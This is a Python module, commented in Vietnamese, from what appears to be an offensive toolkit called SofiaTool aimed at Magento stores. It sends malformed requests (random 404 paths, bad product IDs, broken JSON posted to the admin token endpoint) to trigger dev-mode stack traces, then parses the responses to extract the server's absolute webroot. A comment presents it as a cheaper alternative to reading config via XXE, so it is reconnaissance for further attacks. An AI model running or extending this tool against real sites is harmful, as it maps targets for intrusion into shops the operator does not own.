"""SofiaTool v2 — dò webroot theo lỗi (error-based, in-band).

Khi Magento chạy dev mode, trang exception / JSON error thường kèm absolute
path trong stack trace ("#0 /var/www/magento/vendor/..."). Thay vì đoán path,
ta gửi vài request "mồi" rẻ (không cần OOB, chỉ HTTP thường) và trích webroot
từ response:

  probe()        — bắn loạt request lỗi -> trả list webroot (dedup)
  extract_roots()— regex tìm absolute path rồi rút về root chứa
                   app/|vendor/|pub/|bin/|setup/ (Magento root)

Webroot = segment ngay trước marker:
  /var/www/magento/vendor/...        -> /var/www/magento
  /var/www/html/pub/static/...       -> /var/www/html   (docroot = pub)
  /home/user/public_html/app/code/.. -> /home/user/public_html
"""
import random
import re
import string

import requests

from core import config
from core.logger import get_logger

log = get_logger()

# --- regex trích absolute path -------------------------------------------
_TRACE_FRAME = re.compile(r"#\d+\s+([^\s]+\.php)(?::\d+)?")      # stack frame
_EXC_LOCATION = re.compile(r"\b(?:in|at)\s+([^\s]+\.php)(?::\d+)?")  # PHP fatal
_ABS_PATHS = re.compile(
    r"(?:^|[\s\"'>=(])(/(?:var/www|var/html|home|opt/bitnami|bitnami|srv|www|"
    r"usr/share/nginx|data|app)/[^\s\"'<>()]+)"
)

# Marker quyết định Magento root (thứ tự xét: marker nào gặp đầu tiên).
_MAGENTO_MARKERS = ("app", "vendor", "pub", "bin", "setup")

# Root hợp lệ phải nằm dưới một trong các tiền tố này (loại /usr/bin, /proc...).
_VALID_ROOT_PREFIXES = (
    "/var/www", "/var/html", "/home", "/opt/bitnami", "/bitnami",
    "/srv", "/www", "/usr/share/nginx", "/data", "/app",
)

# Tên thư mục docroot khi path không có marker (ví dụ .../html/index.php).
_DOCROOT_NAMES = ("html", "htdocs", "public_html", "www", "wwwroot",
                  "httpdocs", "magento", "magento2", "web", "site")

_MAX_BODY_SCAN = 200_000  # giới hạn kích thước response cần quét


def _random_suffix(n=6):
    return "".join(random.choice(string.ascii_lowercase) for _ in range(n))


# Các request mồi — {rnd} được thay bằng suffix ngẫu nhiên mỗi lần chạy
# để tránh cache 404. Body là JSON hỏng cố ý (kích exception decode).
ERROR_PROBES = [
    # Mỗi probe kích một exception khác nhau — dev mode sẽ trả stack trace
    # kèm absolute path. 404 thuần không có trace nhưng rẻ nên vẫn giữ.
    ("GET", "/index.php/nonexistent-{rnd}", None),                        # front 404
    ("GET", "/rest/all/V1/products/nonexistent-{rnd}", None),             # REST 404
    ("GET", "/rest/all/V1/products/999999999999999999999999999", None),   # range error
    ("GET", "/rest/all/V1/products?searchCriteria[pageSize]=zzz", None),  # type error
    ("POST", "/rest/all/V1/integration/admin/token", b'{"username":'),    # JSON decode
    ("GET", "/media/catalog/product/cache/1/image/nonexistent-{rnd}.jpg", None),
]


def _root_from_abs(path):
    """Rút webroot từ 1 absolute path; None nếu không phải webroot hợp lệ."""
    if not path or not path.startswith("/"):
        return None
    if path.startswith(("/proc/", "/sys/", "/dev/", "/etc/", "/usr/lib",
                        "/usr/share/php", "/var/lib", "/var/log", "/var/cache")):
        return None
    parts = path.split("/")
    for i, seg in enumerate(parts):
        if seg in _MAGENTO_MARKERS:
            root = "/" + "/".join(parts[1:i])
            break
    else:
        # Không có marker: chỉ tin nếu là index.php hoặc thư mục trông như docroot.
        base = path.rsplit("/", 1)[0]
        leaf = base.rsplit("/", 1)[-1]
        if not (path.endswith("index.php") or leaf in _DOCROOT_NAMES):
            return None
        root = base
    if not root.startswith(_VALID_ROOT_PREFIXES) or len(root) <= 1:
        return None
    return root


def extract_roots(text):
    """Trích list webroot từ nội dung response lỗi (dedup, giữ thứ tự)."""
    roots = []

    def add(p):
        r = _root_from_abs(p)
        if r and r not in roots:
            roots.append(r)

    body = (text or "")[:_MAX_BODY_SCAN]
    for m in _TRACE_FRAME.finditer(body):
        add(m.group(1))
    for m in _EXC_LOCATION.finditer(body):
        add(m.group(1))
    for m in _ABS_PATHS.finditer(body):
        add(m.group(1))
    return roots


def probe(base, timeout=None):
    """Bắn loạt request mồi; trả list webroot tìm được (dedup, giữ thứ tự).

    In-band, không cần OOB — rẻ hơn nhiều so với 1 lần đọc config qua XXE.
    """
    timeout = timeout or min(config.TIMEOUT, 8)
    headers = {"User-Agent": config.USER_AGENT}
    roots = []
    for method, path_tpl, body in ERROR_PROBES:
        path = path_tpl.replace("{rnd}", _random_suffix())
        url = base.rstrip("/") + path
        try:
            if method == "GET":
                r = requests.get(url, headers=headers, timeout=timeout,
                                 verify=False, allow_redirects=False)
            else:
                r = requests.post(url, headers={**headers,
                                                "Content-Type": "application/json"},
                                  data=body, timeout=timeout,
                                  verify=False, allow_redirects=False)
        except requests.RequestException:
            continue  # probe này không phản hồi -> thử probe kế
        found = extract_roots(r.text)
        if found:
            log.info("error-probe: %s %s -> %s", method, path, found)
            for rt in found:
                if rt not in roots:
                    roots.append(rt)
    return roots


